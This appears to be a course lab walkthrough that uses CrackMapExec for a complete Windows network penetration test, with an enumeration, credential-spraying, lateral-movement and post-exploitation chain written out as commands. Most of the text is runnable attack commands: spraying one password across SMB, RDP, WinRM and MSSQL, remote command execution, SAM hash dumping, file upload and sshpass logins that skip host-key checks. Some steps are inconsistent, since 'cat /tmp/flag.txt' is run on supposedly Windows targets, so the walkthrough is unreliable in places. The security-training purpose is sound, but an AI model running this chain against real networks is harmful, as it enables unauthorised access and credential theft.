# Lab 9.3: Complete Windows Penetration Test with CME

## Learning Objectives
- Perform a complete penetration test using CrackMapExec (CME) as the primary tool
- Apply CME throughout the entire attack chain (enumeration → credential discovery → exploitation → lateral movement)
- Understand CME's role in comprehensive network assessments
- Integrate CME with other tools for complete penetration testing
- Capture the flag

## CrackMapExec in Complete Penetration Testing

This lab represents a real-world penetration test scenario where CME is used as the primary tool for network-wide assessment. You'll apply everything you've learned, using CME to automate and streamline the process.

**CME's Role in Penetration Testing**:
- Network enumeration and service identification
- Credential testing across multiple protocols
- Lateral movement and credential reuse
- Post-exploitation automation
- Credential database management

## Solution Walkthrough

### Step 1: Comprehensive Network Enumeration

Start with network discovery using traditional tools, then use CME for service enumeration:

```bash
# Initial network scan
nmap -sV -O -p- <subnet>

# CME network enumeration
crackmapexec smb <subnet> --shares
crackmapexec smb <subnet> --users
crackmapexec smb <subnet> --groups
```

**CME Advantage**: Quickly enumerate SMB services across the entire network.

### Step 2: Credential Discovery and Testing

Use CME to test discovered credentials across all protocols:

```bash
# Test credentials on SMB
crackmapexec smb <subnet> -u admin -p password123

# Test credentials on RDP
crackmapexec rdp <subnet> -u admin -p password123

# Test credentials on WinRM
crackmapexec winrm <subnet> -u admin -p password123

# Test credentials on MSSQL
crackmapexec mssql <subnet> -u admin -p password123
```

**CME Advantage**: One command tests credentials across the entire network for each protocol.

### Step 3: Credential Reuse and Lateral Movement

Use CME to identify where credentials work and move laterally:

```bash
# Identify all targets accepting credentials
crackmapexec smb <subnet> -u admin -p password123

# Use CME to execute commands on compromised targets
crackmapexec smb <compromised_target> -u admin -p password123 -x "whoami"

# Enumerate shares on compromised targets
crackmapexec smb <compromised_target> -u admin -p password123 --shares
```

### Step 4: Post-Exploitation with CME

Use CME for automated post-exploitation tasks:

```bash
# Dump SAM on compromised targets
crackmapexec smb <target> -u admin -p password123 --sam

# Execute commands to retrieve flags
crackmapexec smb <target> -u admin -p password123 -x "cat /tmp/flag.txt"

# Upload tools or files
crackmapexec smb <target> -u admin -p password123 --put-file local.txt remote.txt
```

### Step 5: Complete Attack Chain with CME

Combine CME with SSH for complete exploitation:

```bash
# 1. Enumeration (CME)
crackmapexec smb <subnet> --shares

# 2. Credential Testing (CME)
crackmapexec smb <subnet> -u admin -p password123

# 3. Flag Retrieval (SSH)
sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@<target_ip> "cat /tmp/private/flag.txt"

# 4. Lateral Movement (CME)
crackmapexec smb <target_ip> -u admin -p password123 -x "cat /tmp/flag.txt"
```

## Complete Penetration Test Workflow

### Phase 1: Reconnaissance
- Network scanning (nmap)
- Service enumeration (CME)

### Phase 2: Credential Discovery
- User enumeration (CME)
- Credential testing (CME)
- Brute forcing (Hydra/Medusa, then test with CME)

### Phase 3: Initial Access
- Service exploitation (CME + manual tools)
- Flag retrieval

### Phase 4: Lateral Movement
- Credential reuse (CME)
- Network-wide exploitation (CME)
- Post-exploitation (CME)

## CME Workflow for This Lab

```bash
# 1. Enumerate network
crackmapexec smb <subnet> --shares

# 2. Test discovered credentials
crackmapexec smb <subnet> -u admin -p password123
crackmapexec rdp <subnet> -u admin -p password123

# 3. Enumerate compromised targets
crackmapexec smb <target> -u admin -p password123 --shares --users

# 4. Execute commands
crackmapexec smb <target> -u admin -p password123 -x "cat /tmp/flag.txt"

# 5. Lateral movement
crackmapexec smb <subnet> -u admin -p password123 -x "whoami"
```

## Integration with Other Tools

CME works alongside other tools:

```bash
# Use nmap for initial discovery
nmap -sV <subnet>

# Use CME for credential verification
crackmapexec smb <subnet> -u admin -p password123

# Use SSH for flag retrieval
sshpass -p 'password123' ssh -o StrictHostKeyChecking=no admin@<target_ip> "cat /tmp/private/flag.txt"
```

## Target Information

- Multiple Windows targets across network
- Various services: SMB, RDP, WinRM, MSSQL
- Credentials: `admin:password123`
- Flag at `/tmp/private/flag.txt`, accessible via SSH with `admin:password123`

## Hints

1. Start with network enumeration using CME
2. Use CME to test credentials across all protocols
3. CME output shows which targets are compromised (green [+])
4. Use SSH to retrieve the flag once credentials are confirmed
5. Use CME for lateral movement across the network

## Common Mistakes

- Not using CME for network-wide testing (testing one target at a time)
- Forgetting CME can enumerate and execute commands
- Not combining CME with other tools appropriately
- Not understanding CME's role in each phase of penetration testing

## Educational Context

### Real-World Penetration Testing

In actual assessments, penetration testers:
1. Use CME for efficient network-wide credential testing
2. Combine CME with other tools for comprehensive testing
3. Use CME's credential database to track discovered credentials
4. Apply CME throughout the entire attack chain

### Tool Mastery Progression

- **Labs 8.1-8.4**: Manual tools (foundation and understanding)
- **Lab 8.5**: CME introduction (automation basics)
- **Lab 9.2**: CME for multi-service exploitation (practical application)
- **Lab 9.3**: CME for complete penetration test (comprehensive mastery)

### Industry Standard

CME is considered an industry-standard tool for Windows network penetration testing. Understanding CME is essential for:
- Penetration testing careers
- Red team operations
- Internal security assessments
- Network security testing

## Further Reading

- See `CME_REFERENCE.md` for comprehensive CME documentation
- Review Labs 8.5 and 9.2 for CME progression
- Practice CME commands in realistic scenarios
- Study CME's post-exploitation capabilities

## Assessment

You've successfully completed this lab when you:
- [ ] Can use CME for network enumeration
- [ ] Can use CME for credential testing across multiple protocols
- [ ] Can use CME for lateral movement
- [ ] Can use CME for post-exploitation tasks
- [ ] Understand CME's role in complete penetration testing
- [ ] Have captured all flags through the complete attack chain